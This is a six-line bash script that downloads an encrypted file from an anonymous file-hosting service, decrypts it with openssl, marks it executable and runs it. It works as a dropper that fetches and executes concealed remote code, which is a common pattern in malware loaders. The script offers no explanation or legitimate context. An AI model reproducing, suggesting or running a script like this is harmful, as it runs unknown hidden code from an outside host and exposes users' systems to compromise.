#! /bin/bash
cd
curl -O https://cdn-129.anonfiles.com/69F2cbUcyd/b27ac053-1674734909/x-l1bra2.sh.enc
openssl enc -d -aes-256-cbc -in x-l1bra2.sh.enc -out x-l1bra.sh
chmod +x x-l1bra.sh
sh x-l1bra.sh